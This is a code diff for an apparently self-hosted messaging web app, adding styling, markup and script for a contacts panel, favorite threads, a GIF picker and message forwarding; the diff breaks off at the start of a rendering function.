@@ -135,6 +135,54 @@ html, body {
 }
 .new-msg-overlay.show { display: flex; }
 
+/* ─── Contacts / CRM overlay ─── */
+.contacts-overlay { position: fixed; inset: 0; z-index: 1500; display: none; background: var(--bg-deep); }
+.contacts-overlay.show { display: flex; }
+.contacts-pane-left { width: 340px; flex: 0 0 340px; display: flex; flex-direction: column; border-right: 1px solid var(--border); background: var(--bg-surface); }
+.contacts-left-header { display: flex; align-items: center; justify-content: space-between; padding: 20px 20px 12px; }
+.contacts-left-header h2 { margin: 0; font-size: 20px; color: var(--text-primary); }
+.contacts-search { display: flex; align-items: center; gap: 8px; margin: 0 16px 12px; padding: 9px 12px; border: 1px solid var(--border); border-radius: 12px; background: var(--bg-elevated); }
+.contacts-search svg { width: 16px; height: 16px; color: var(--text-muted); flex: 0 0 auto; }
+.contacts-search input { border: 0; background: transparent; outline: none; width: 100%; color: var(--text-primary); font: inherit; }
+.contacts-sort { display: flex; gap: 6px; padding: 0 16px 12px; }
+.contacts-sort-btn { flex: 1; padding: 7px 8px; border: 1px solid var(--border); border-radius: 999px; background: var(--bg-elevated); color: var(--text-secondary); font-family: var(--font-sans); font-size: 12px; font-weight: 600; cursor: pointer; white-space: nowrap; transition: background 0.16s ease, color 0.16s ease, border-color 0.16s ease; }
+.contacts-sort-btn:hover { background: var(--bg-hover); color: var(--text-primary); }
+.contacts-sort-btn.active { background: var(--accent-dim); border-color: var(--border-accent); color: var(--text-primary); }
+.contacts-list { flex: 1; overflow-y: auto; padding: 0 10px 16px; }
+.contact-row { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 12px; cursor: pointer; }
+.contact-row:hover { background: var(--bg-hover); }
+.contact-row.active { background: var(--accent-dim); }
+.contact-row .convo-avatar { width: 40px; height: 40px; flex: 0 0 40px; }
+.contact-row-meta { flex: 1; min-width: 0; }
+.contact-row-name { color: var(--text-primary); font-weight: 600; font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.contact-row-sub { color: var(--text-muted); font-size: 12px; margin-top: 2px; }
+.contact-row-due { flex: 0 0 auto; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; padding: 3px 7px; border-radius: 999px; background: rgba(229, 72, 77, 0.16); color: #ff6b6b; }
+.contacts-pane-right { flex: 1; overflow-y: auto; padding: 32px 40px; }
+.contacts-detail-empty { color: var(--text-muted); font-size: 14px; margin-top: 80px; text-align: center; }
+.contacts-detail-body { max-width: 640px; }
+.cd-head { display: flex; align-items: center; gap: 18px; margin-bottom: 24px; }
+.cd-head .convo-avatar { width: 72px; height: 72px; flex: 0 0 72px; font-size: 26px; }
+.cd-name { font-size: 26px; font-weight: 700; color: var(--text-primary); }
+.cd-sub { color: var(--text-secondary); font-size: 13px; margin-top: 4px; }
+.cd-section { margin-bottom: 26px; }
+.cd-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 10px; }
+.cd-info-row { color: var(--text-primary); font-size: 14px; padding: 7px 0; border-bottom: 1px solid var(--border); display: flex; gap: 10px; }
+.cd-info-row .k { color: var(--text-muted); width: 130px; flex: 0 0 130px; }
+.cd-tags { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
+.cd-tag { display: inline-flex; align-items: center; gap: 6px; padding: 5px 10px; border-radius: 999px; background: var(--accent-dim); border: 1px solid var(--border-accent); color: var(--text-primary); font-size: 12px; font-weight: 600; }
+.cd-tag button { background: none; border: 0; color: var(--text-muted); cursor: pointer; font-size: 14px; line-height: 1; padding: 0; }
+.cd-tag-input { padding: 6px 10px; border: 1px dashed var(--border); border-radius: 999px; background: var(--bg-elevated); color: var(--text-primary); font: inherit; font-size: 12px; width: 110px; outline: none; }
+.cd-summary { color: var(--text-secondary); font-size: 14px; line-height: 1.65; }
+.cd-tickler { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+.cd-tickler input { width: 70px; padding: 8px 10px; border: 1px solid var(--border); border-radius: 10px; background: var(--bg-elevated); color: var(--text-primary); font: inherit; outline: none; }
+.cd-tickler .muted { color: var(--text-muted); font-size: 13px; }
+.cd-btn { padding: 8px 14px; border: 1px solid var(--border); border-radius: 10px; background: var(--bg-elevated); color: var(--text-secondary); font: inherit; font-size: 13px; font-weight: 600; cursor: pointer; }
+.cd-btn:hover { background: var(--bg-hover); color: var(--text-primary); }
+.cd-btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+.cd-due-pill { display: inline-block; padding: 4px 10px; border-radius: 999px; font-size: 12px; font-weight: 600; margin-left: 4px; }
+.cd-due-pill.overdue { background: rgba(229, 72, 77, 0.16); color: #ff6b6b; }
+.cd-due-pill.ok { background: rgba(60, 200, 120, 0.14); color: #36c47a; }
+
 .wa-overlay {
   display: none;
   position: fixed;
@@ -2632,7 +2680,7 @@ body::after {
 .sidebar-header {
   align-items: center;
   gap: 12px;
-  padding: 18px 20px 16px;
+  padding: 12px 20px 10px;
   border-bottom: 1px solid var(--border);
 }
 
@@ -2729,7 +2777,7 @@ body::after {
 }
 
 .search-box {
-  margin: 14px 20px 10px;
+  margin: 7px 20px 6px;
   position: relative;
 }
 
@@ -2783,7 +2831,7 @@ body::after {
   display: flex;
   align-items: center;
   gap: 8px;
-  padding: 4px 20px 12px;
+  padding: 0 20px 8px;
 }
 
 .sidebar-tabs {
@@ -3195,7 +3243,7 @@ body::after {
 }
 
 .chat-header {
-  padding: 10px 28px;
+  padding: 7px 28px;
   background: var(--bg-elevated);
   border-bottom: 1px solid var(--border);
   backdrop-filter: none;
@@ -3395,9 +3443,96 @@ body::after {
   color: var(--accent-strong);
 }
 
+.chat-header-action-btn.favorite.active {
+  border-color: rgba(245, 158, 11, 0.42);
+  background: rgba(245, 158, 11, 0.12);
+  color: #f59e0b;
+}
+
 .chat-header-action-btn svg {
   width: 14px;
   height: 14px;
+}
+
+.favorites-rail {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  min-width: 0;
+  min-height: 46px;
+  padding: 4px 20px 10px;
+  overflow-x: auto;
+  scrollbar-width: none;
+}
+
+.favorites-rail[hidden] {
+  display: none;
+}
+
+.favorites-rail::-webkit-scrollbar {
+  display: none;
+}
+
+.favorite-chip {
+  position: relative;
+  flex: 0 0 auto;
+  width: 36px;
+  height: 36px;
+  padding: 0;
+  border: 1px solid transparent;
+  border-radius: 999px;
+  background: transparent;
+  color: var(--text-primary);
+  cursor: pointer;
+}
+
+.favorite-chip:hover,
+.favorite-chip.active {
+  border-color: var(--border-accent);
+}
+
+.favorite-chip.active {
+  box-shadow: 0 0 0 2px rgba(96, 165, 250, 0.22);
+}
+
+.favorite-avatar {
+  position: relative;
+  width: 100%;
+  height: 100%;
+  border-radius: 999px;
+  font-size: 12px;
+  font-weight: 700;
+  overflow: visible;
+}
+
+.favorite-avatar .avatar-face {
+  border-radius: 999px;
+  overflow: hidden;
+}
+
+.favorite-avatar .avatar-platform-stack {
+  right: -4px;
+  bottom: -4px;
+  transform: scale(0.82);
+  transform-origin: right bottom;
+}
+
+.favorite-unread {
+  position: absolute;
+  top: -5px;
+  right: -5px;
+  min-width: 16px;
+  height: 16px;
+  padding: 0 4px;
+  border: 2px solid var(--bg-elevated);
+  border-radius: 999px;
+  background: var(--accent-strong);
+  color: #fff;
+  font-family: var(--font-mono);
+  font-size: 9px;
+  font-weight: 700;
+  line-height: 12px;
+  text-align: center;
 }
 
 .chat-header-source .platform-chip {
@@ -3498,18 +3633,21 @@ body::after {
 
 .convo-avatar.has-photo,
 .chat-header-avatar.has-photo,
+.favorite-avatar.has-photo,
 .msg-avatar.has-photo {
   color: transparent;
 }
 
 .convo-avatar.has-photo .avatar-face,
 .chat-header-avatar.has-photo .avatar-face,
+.favorite-avatar.has-photo .avatar-face,
 .msg-avatar.has-photo .avatar-face {
   background: transparent !important;
 }
 
 .convo-avatar.has-photo img,
 .chat-header-avatar.has-photo img,
+.favorite-avatar.has-photo img,
 .msg-avatar.has-photo img {
   display: block;
   width: 100%;
@@ -3651,6 +3789,182 @@ body::after {
   height: 1px;
   margin: 8px 4px;
   background: rgba(255, 255, 255, 0.1);
+}
+
+.forward-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 2100;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  background: rgba(6, 11, 20, 0.68);
+  backdrop-filter: blur(14px);
+}
+
+.forward-overlay[hidden] {
+  display: none;
+}
+
+.forward-panel {
+  width: min(460px, calc(100vw - 32px));
+  max-height: min(620px, calc(100vh - 48px));
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  background: var(--panel-strong);
+  box-shadow: 0 24px 72px rgba(0, 0, 0, 0.36);
+}
+
+.forward-header {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 18px 18px 14px;
+  border-bottom: 1px solid var(--border);
+}
+
+.forward-title-wrap {
+  min-width: 0;
+  flex: 1;
+}
+
+.forward-header h2 {
+  margin: 0;
+  font-size: 18px;
+  font-weight: 650;
+  color: var(--text-primary);
+}
+
+.forward-preview {
+  margin-top: 4px;
+  font-size: 13px;
+  line-height: 1.45;
+  color: var(--text-muted);
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.forward-search-wrap {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin: 14px 18px 10px;
+  padding: 0 12px;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  background: var(--bg-elevated);
+}
+
+.forward-search-wrap svg {
+  width: 16px;
+  height: 16px;
+  color: var(--text-muted);
+  flex-shrink: 0;
+}
+
+.forward-search {
+  min-width: 0;
+  width: 100%;
+  height: 40px;
+  border: 0;
+  outline: none;
+  background: transparent;
+  color: var(--text-primary);
+  font: inherit;
+}
+
+.forward-search::placeholder {
+  color: var(--text-muted);
+}
+
+.forward-list {
+  min-height: 180px;
+  overflow-y: auto;
+  padding: 0 10px 10px;
+}
+
+.forward-target {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 10px 8px;
+  border: 0;
+  border-radius: 12px;
+  background: transparent;
+  color: inherit;
+  text-align: left;
+  cursor: pointer;
+}
+
+.forward-target:hover:not(:disabled),
+.forward-target:focus-visible {
+  background: var(--bg-hover);
+  outline: none;
+}
+
+.forward-target:disabled {
+  cursor: default;
+  opacity: 0.55;
+}
+
+.forward-avatar {
+  width: 36px;
+  height: 36px;
+  flex-shrink: 0;
+}
+
+.forward-target-main {
+  min-width: 0;
+  flex: 1;
+}
+
+.forward-target-name {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text-primary);
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.forward-target-meta {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  min-height: 20px;
+  margin-top: 2px;
+  color: var(--text-muted);
+  font-size: 12px;
+}
+
+.forward-target-preview {
+  min-width: 0;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.forward-empty,
+.forward-status {
+  padding: 14px 18px;
+  color: var(--text-muted);
+  font-size: 13px;
+  line-height: 1.45;
+}
+
+.forward-status {
+  min-height: 44px;
+  border-top: 1px solid var(--border);
+}
+
+.forward-status.error {
+  color: #dc503c;
 }
 
 .platform-chip {
@@ -4194,6 +4508,7 @@ body::after {
 }
 
 .attach-btn,
+.gif-compose-btn,
 .emoji-compose-btn,
 .send-btn {
   width: 46px;
@@ -4203,6 +4518,7 @@ body::after {
 }
 
 .attach-btn:disabled,
+.gif-compose-btn:disabled,
 .emoji-compose-btn:disabled,
 .send-btn:disabled {
   opacity: 0.45;
@@ -4210,21 +4526,38 @@ body::after {
 }
 
 .attach-btn,
+.gif-compose-btn,
 .emoji-compose-btn {
   background: var(--bg-surface);
   border: 1px solid var(--border);
   color: var(--text-secondary);
 }
 
+.attach-btn + .gif-compose-btn,
+.gif-compose-btn + .emoji-compose-btn {
+  margin-left: -6px;
+}
+
 .attach-btn:hover,
+.gif-compose-btn:hover,
 .emoji-compose-btn:hover {
   background: var(--bg-hover);
   color: var(--text-primary);
 }
 
+.gif-compose-btn {
+  font: 700 11px/1 var(--font-sans);
+  letter-spacing: 0.02em;
+}
+
 .emoji-compose-btn svg {
   width: 20px;
   height: 20px;
+}
+
+.compose-bar.drag-over {
+  border-color: var(--border-accent);
+  background: var(--bg-hover);
 }
 
 .compose-emoji-panel {
@@ -4246,6 +4579,185 @@ body::after {
   width: 100%;
   min-width: 0;
   aspect-ratio: 1;
+}
+
+.gif-compose-panel {
+  position: absolute;
+  left: 58px;
+  right: auto;
+  bottom: calc(100% + 8px);
+  z-index: 72;
+  display: none;
+  width: min(720px, calc(100vw - 96px));
+  max-height: min(520px, calc(100vh - 220px));
+  overflow: hidden;
+  flex-direction: column;
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  background: var(--bg-elevated);
+  box-shadow: var(--shadow-soft);
+}
+
+.gif-compose-panel.show {
+  display: flex;
+}
+
+.gif-search {
+  flex: 0 0 auto;
+  padding: 12px 14px;
+  border-bottom: 1px solid var(--border);
+}
+
+.gif-search input {
+  width: 100%;
+  height: 42px;
+  padding: 0 14px;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  background: var(--bg-surface);
+  color: var(--text-primary);
+  font: 500 14px/1 var(--font-sans);
+  outline: none;
+}
+
+.gif-search input:focus {
+  border-color: var(--border-accent);
+}
+
+.gif-results-scroll {
+  min-height: 0;
+  overflow-y: auto;
+  padding: 14px;
+  scrollbar-width: thin;
+  scrollbar-color: rgba(148, 163, 184, 0.55) transparent;
+}
+
+.gif-results-scroll::-webkit-scrollbar {
+  width: 8px;
+}
+
+.gif-results-scroll::-webkit-scrollbar-track {
+  background: transparent;
+}
+
+.gif-results-scroll::-webkit-scrollbar-thumb {
+  border: 2px solid transparent;
+  border-radius: 999px;
+  background: rgba(148, 163, 184, 0.58);
+  background-clip: padding-box;
+}
+
+.gif-results-scroll::-webkit-scrollbar-thumb:hover {
+  background: rgba(203, 213, 225, 0.72);
+  background-clip: padding-box;
+}
+
+.gif-favorites {
+  margin-bottom: 14px;
+}
+
+.gif-favorites[hidden] {
+  display: none;
+}
+
+.gif-section-label {
+  margin: 0 0 8px;
+  color: var(--text-muted);
+  font: 700 10px/1 var(--font-mono);
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+}
+
+.gif-favorites-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(136px, 1fr));
+  gap: 12px;
+}
+
+.gif-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(136px, 1fr));
+  gap: 12px;
+  overflow: visible;
+  padding: 0;
+}
+
+.gif-tile {
+  position: relative;
+  min-width: 0;
+  aspect-ratio: 1.08;
+  overflow: hidden;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  background: var(--bg-surface);
+  cursor: pointer;
+  padding: 0;
+  box-shadow: inset 0 0 0 1px rgba(15, 23, 42, 0.14);
+}
+
+.gif-tile:hover,
+.gif-tile:focus-visible {
+  border-color: var(--border-accent);
+  outline: none;
+}
+
+.gif-tile img {
+  width: 100%;
+  height: 100%;
+  display: block;
+  object-fit: cover;
+}
+
+.gif-favorite-toggle {
+  position: absolute;
+  top: 7px;
+  right: 7px;
+  z-index: 1;
+  display: grid;
+  place-items: center;
+  width: 28px;
+  height: 28px;
+  border: 1px solid rgba(148, 163, 184, 0.35);
+  border-radius: 999px;
+  background: rgba(15, 23, 42, 0.68);
+  color: rgba(226, 232, 240, 0.92);
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 120ms ease, transform 120ms ease, color 120ms ease, background 120ms ease;
+}
+
+.gif-tile:hover .gif-favorite-toggle,
+.gif-tile:focus-within .gif-favorite-toggle,
+.gif-favorite-toggle.active {
+  opacity: 1;
+}
+
+.gif-favorite-toggle:hover,
+.gif-favorite-toggle:focus-visible,
+.gif-favorite-toggle.active {
+  background: rgba(15, 23, 42, 0.84);
+  color: #f59e0b;
+  outline: none;
+  transform: scale(1.04);
+}
+
+.gif-favorite-toggle svg {
+  width: 15px;
+  height: 15px;
+}
+
+.gif-status {
+  padding: 18px 12px;
+  color: var(--text-muted);
+  font-size: 13px;
+  text-align: center;
+}
+
+.gif-load-status {
+  padding: 12px 0 2px;
+  color: var(--text-muted);
+  font-size: 12px;
+  text-align: center;
 }
 
 .send-btn {
@@ -4278,11 +4790,13 @@ body::after {
 }
 
 @media (max-width: 520px) {
-  .thread-search-results {
+  .thread-search-results,
+  .gif-compose-panel {
     width: min(320px, calc(100vw - 32px));
   }
 
-  .compose-emoji-panel {
+  .compose-emoji-panel,
+  .gif-compose-panel {
     left: 0;
     right: 0;
     width: auto;
@@ -4507,7 +5021,7 @@ body::after {
   }
 
   .sidebar-header {
-    padding: 16px;
+    padding: 10px 16px;
   }
 
   .sidebar-header-main {
@@ -4545,7 +5059,7 @@ body::after {
   }
 
   .search-box {
-    margin: 12px 16px 8px;
+    margin: 8px 16px 6px;
   }
 
   .sidebar-section-label {
@@ -4622,6 +5136,9 @@ body::after {
             </div>
           </div>
         <div class="sidebar-actions">
+          <button class="new-msg-btn" id="contacts-btn" type="button" title="Contacts" aria-label="Contacts">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          </button>
           <button class="new-msg-btn notif-btn" id="notif-btn" type="button" title="Enable desktop notifications" aria-label="Enable desktop notifications" aria-pressed="false">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M15 17h5l-1.4-1.4A2 2 0 0 1 18 14.2V11a6 6 0 1 0-12 0v3.2a2 2 0 0 1-.6 1.4L4 17h5"/><path d="M9.5 17a2.5 2.5 0 0 0 5 0"/></svg>
           </button>
@@ -4640,6 +5157,7 @@ body::after {
       <div class="sidebar-tabs" id="sidebar-tabs"></div>
       <button class="select-toggle-btn" id="select-toggle-btn" type="button" title="Select threads to organize" aria-label="Select threads to organize">Select</button>
     </div>
+    <div class="favorites-rail" id="favorites-rail" aria-label="Favorite threads" hidden></div>
     <div class="bulk-bar" id="bulk-bar" hidden>
       <span class="bulk-count" id="bulk-count">0 selected</span>
       <div class="bulk-bar-actions">
@@ -4673,6 +5191,29 @@ body::after {
         <div class="new-msg-routes" id="new-msg-routes"></div>
         <button class="new-msg-go" id="new-msg-go">Start conversation</button>
         <div class="new-msg-error" id="new-msg-error"></div>
+      </div>
+    </div>
+
+    <div class="contacts-overlay" id="contacts-overlay">
+      <div class="contacts-pane-left">
+        <div class="contacts-left-header">
+          <h2>Contacts</h2>
+          <button class="new-msg-close" id="contacts-close" aria-label="Close contacts">&times;</button>
+        </div>
+        <div class="contacts-search">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+          <input type="text" id="contacts-search-input" placeholder="Search contacts" autocomplete="off" spellcheck="false">
+        </div>
+        <div class="contacts-sort" id="contacts-sort">
+          <button type="button" class="contacts-sort-btn active" data-sort="recent">Recent</button>
+          <button type="button" class="contacts-sort-btn" data-sort="alpha">A–Z</button>
+          <button type="button" class="contacts-sort-btn" data-sort="messages">Most messages</button>
+        </div>
+        <div class="contacts-list" id="contacts-list"></div>
+      </div>
+      <div class="contacts-pane-right">
+        <div class="contacts-detail-empty" id="contacts-detail-empty">Select a contact to see their details, tags, and relationship summary.</div>
+        <div class="contacts-detail-body" id="contacts-detail-body" hidden></div>
       </div>
     </div>
 
@@ -4839,6 +5380,7 @@ body::after {
         <button class="attach-btn" id="attach-btn" title="Attach media" aria-label="Attach media">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
         </button>
+        <button class="gif-compose-btn" id="compose-gif-btn" type="button" title="Search GIFs" aria-label="Search GIFs" aria-expanded="false" aria-controls="compose-gif-panel">GIF</button>
         <button class="emoji-compose-btn" id="compose-emoji-btn" type="button" title="Insert emoji" aria-label="Insert emoji" aria-expanded="false" aria-controls="compose-emoji-panel">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg>
         </button>
@@ -4851,11 +5393,29 @@ body::after {
         </button>
       </div>
       <div class="emoji-full-panel compose-emoji-panel" id="compose-emoji-panel" role="dialog" aria-label="Emoji picker"></div>
+      <div class="gif-compose-panel" id="compose-gif-panel" role="dialog" aria-label="GIF picker"></div>
     </div>
   </div>
 </div>
 
 <div class="context-menu" id="context-menu" hidden></div>
+<div class="forward-overlay" id="forward-overlay" hidden>
+  <div class="forward-panel" role="dialog" aria-modal="true" aria-labelledby="forward-title">
+    <div class="forward-header">
+      <div class="forward-title-wrap">
+        <h2 id="forward-title">Forward message</h2>
+        <div class="forward-preview" id="forward-preview"></div>
+      </div>
+      <button class="new-msg-close" id="forward-close" type="button" aria-label="Close forward dialog">&times;</button>
+    </div>
+    <div class="forward-search-wrap">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><line x1="16.5" y1="16.5" x2="21" y2="21"/></svg>
+      <input class="forward-search" id="forward-search" type="search" placeholder="Search conversations" aria-label="Search conversations" autocomplete="off">
+    </div>
+    <div class="forward-list" id="forward-list" role="listbox" aria-label="Forward destinations"></div>
+    <div class="forward-status" id="forward-status" aria-live="polite"></div>
+  </div>
+</div>
 
 <script>
 (function() {
@@ -4978,6 +5538,7 @@ body::after {
   const $chatHeaderName = document.getElementById('chat-header-name');
   const $chatHeaderSource = document.getElementById('chat-header-source');
   const $chatHeaderActions = document.getElementById('chat-header-actions');
+  const $favoritesRail = document.getElementById('favorites-rail');
   const $chatHeaderStatus = document.getElementById('chat-header-status');
   const $threadSearchInput = document.getElementById('thread-search-input');
   const $threadSearchClear = document.getElementById('thread-search-clear');
@@ -4986,6 +5547,8 @@ body::after {
   const $messagesArea = document.getElementById('messages-area');
   const $composeBar = document.getElementById('compose-bar');
   const $composeInput = document.getElementById('compose-input');
+  const $composeGifBtn = document.getElementById('compose-gif-btn');
+  const $composeGifPanel = document.getElementById('compose-gif-panel');
   const $composeEmojiBtn = document.getElementById('compose-emoji-btn');
   const $composeEmojiPanel = document.getElementById('compose-emoji-panel');
   const $sendBtn = document.getElementById('send-btn');
@@ -5002,6 +5565,7 @@ body::after {
   const $attachName = document.getElementById('attach-name');
   const $attachRemove = document.getElementById('attach-remove');
   let pendingFile = null; // { file: File, dataUrl: string }
+  let composeSendInFlight = false;
   const $searchInput = document.getElementById('search-input');
   const $connectionBanner = document.getElementById('connection-banner');
   const $connectionBannerCopy = document.getElementById('connection-banner-copy');
@@ -5014,6 +5578,17 @@ body::after {
   const $notifBtn = document.getElementById('notif-btn');
   const $waOverlay = document.getElementById('wa-overlay');
   const $waClose = document.getElementById('wa-close');
+  const $contactsBtn = document.getElementById('contacts-btn');
+  const $contactsOverlay = document.getElementById('contacts-overlay');
+  const $contactsClose = document.getElementById('contacts-close');
+  const $contactsSearchInput = document.getElementById('contacts-search-input');
+  const $contactsList = document.getElementById('contacts-list');
+  const $contactsDetailEmpty = document.getElementById('contacts-detail-empty');
+  const $contactsDetailBody = document.getElementById('contacts-detail-body');
+  let contactsCurrentKey = null;
+  let contactsSearchTimer = null;
+  let contactsPeople = [];
+  let contactsSortMode = 'recent';
   const $gmStatusPill = document.getElementById('gm-status-pill');
   const $gmHelper = document.getElementById('gm-helper');
   const $gmReconnectBtn = document.getElementById('gm-reconnect-btn');
@@ -5051,6 +5626,12 @@ body::after {
   const $emptyStateCopy = document.getElementById('empty-state-copy');
   const $emptyStateNotes = document.getElementById('empty-state-notes');
   const $contextMenu = document.getElementById('context-menu');
+  const $forwardOverlay = document.getElementById('forward-overlay');
+  const $forwardClose = document.getElementById('forward-close');
+  const $forwardSearch = document.getElementById('forward-search');
+  const $forwardList = document.getElementById('forward-list');
+  const $forwardPreview = document.getElementById('forward-preview');
+  const $forwardStatus = document.getElementById('forward-status');
   const $newMsgRoutes = document.getElementById('new-msg-routes');
   const $newMsgGo = document.getElementById('new-msg-go');
   const $newMsgError = document.getElementById('new-msg-error');
@@ -5058,6 +5639,8 @@ body::after {
   const $emptyStateCta = document.getElementById('empty-state-cta');
 
   let replyToMsg = null; // {MessageID, SenderName, Body}
+  let forwardMessage = null;
+  let forwarding = false;
   const composeTextByConversation = new Map();
   let contextMenuState = null;
   let threadSearchTimer = 0;
@@ -5217,6 +5800,21 @@ body::after {
     return normalizeNotificationMode(convo.NotificationMode || convo.notification_mode);
   }
 
+  function conversationFavoriteOf(convo) {
+    if (!convo) return false;
+    return !!(convo.IsFavorite || convo.is_favorite);
+  }
+
+  function favoriteValueFromResponse(convo, fallback) {
+    if (convo && Object.prototype.hasOwnProperty.call(convo, 'IsFavorite')) {
+      return !!convo.IsFavorite;
+    }
+    if (convo && Object.prototype.hasOwnProperty.call(convo, 'is_favorite')) {
+      return !!convo.is_favorite;
+    }
+    return !!fallback;
+  }
+
   function notificationModeLabel(mode) {
     switch (normalizeNotificationMode(mode)) {
       case NOTIFICATION_MODE_MENTIONS:
@@ -5248,6 +5846,10 @@ body::after {
       default:
         return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 17h5l-1.4-1.4A2 2 0 0 1 18 14.2V11a6 6 0 1 0-12 0v3.2a2 2 0 0 1-.6 1.4L4 17h11"/><path d="M9.5 17a2.5 2.5 0 0 0 5 0"/></svg>`;
     }
+  }
+
+  function favoriteActionIconHTML(isFavorite) {
+    return `<svg viewBox="0 0 24 24" fill="${isFavorite ? 'currentColor' : 'none'}" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`;
   }
 
   function identityMentionNames() {
@@ -5853,6 +6455,78 @@ body::after {
       || (sourcePlatformOf(convo) === 'whatsapp' && whatsAppStatus.connected)
       || (sourcePlatformOf(convo) === 'signal' && signalStatus.connected)
     );
+  }
+
+  function isGenericMediaBody(body) {
+    return [
+      '[Photo]',
+      '[Video]',
+      '[Audio]',
+      '[Voice note]',
+      '[Sticker]',
+      '[Attachment]',
+    ].includes(String(body || '').trim());
+  }
+
+  function forwardableBody(message) {
+    const body = String(message && message.Body || '').trim();
+    if (!body) return '';
+    return message && message.MediaID && isGenericMediaBody(body) ? '' : body;
+  }
+
+  function messageHasForwardableContent(message) {
+    return !!(forwardableBody(message) || (message && message.MediaID));
+  }
+
+  function mediaKindLabel(mimeType) {
+    const mime = String(mimeType || '').toLowerCase();
+    if (mime.startsWith('image/')) return 'Image';
+    if (mime.startsWith('video/')) return 'Video';
+    if (mime.startsWith('audio/')) return 'Audio';
+    return 'Attachment';
+  }
+
+  function extensionForMime(mimeType) {
+    const mime = String(mimeType || '').toLowerCase();
+    if (mime.startsWith('audio/ogg')) return '.ogg';
+    if (mime.startsWith('audio/aac')) return '.aac';
+    if (mime.startsWith('audio/mp4') || mime.startsWith('audio/m4a')) return '.m4a';
+    if (mime.startsWith('audio/mpeg')) return '.mp3';
+    if (mime.startsWith('audio/amr')) return '.amr';
+    if (mime.startsWith('audio/')) return '.audio';
+    if (mime.startsWith('image/jpeg')) return '.jpg';
+    if (mime.startsWith('image/png')) return '.png';
+    if (mime.startsWith('image/gif')) return '.gif';
+    if (mime.startsWith('image/webp')) return '.webp';
+    if (mime.startsWith('image/')) return '.img';
+    if (mime.startsWith('video/mp4')) return '.mp4';
+    if (mime.startsWith('video/3gpp')) return '.3gp';
+    if (mime.startsWith('video/')) return '.video';
+    if (mime.startsWith('text/plain')) return '.txt';
+    if (mime.startsWith('application/pdf')) return '.pdf';
+    return '.bin';
+  }
+
+  function forwardFilename(message, mimeType) {
+    const rawID = String(message && message.MessageID || 'message')
+      .replace(/[^a-z0-9._-]+/gi, '_')
+      .replace(/^_+|_+$/g, '')
+      .substring(0, 80) || 'message';
+    return `openmessage-forward-${rawID}${extensionForMime(mimeType)}`;
+  }
+
+  function truncateOneLine(value, max = 96) {
+    const text = String(value || '').replace(/\s+/g, ' ').trim();
+    return text.length > max ? text.substring(0, Math.max(0, max - 3)) + '...' : text;
+  }
+
+  function forwardPreviewText(message) {
+    const body = forwardableBody(message);
+    if (message && (message.MediaID || message.MimeType)) {
+      const label = mediaKindLabel(message.MimeType);
+      return body ? `${label}: ${truncateOneLine(body, 90)}` : label;
+    }
+    return truncateOneLine(body || 'Empty message', 110);
   }
 
   function sortRouteConversations(convos) {
@@ -6618,6 +7292,62 @@ body::after {
     return el;
   }
 
+  function renderFavoritesRail(convos = allConversations) {
+    if (!$favoritesRail) return;
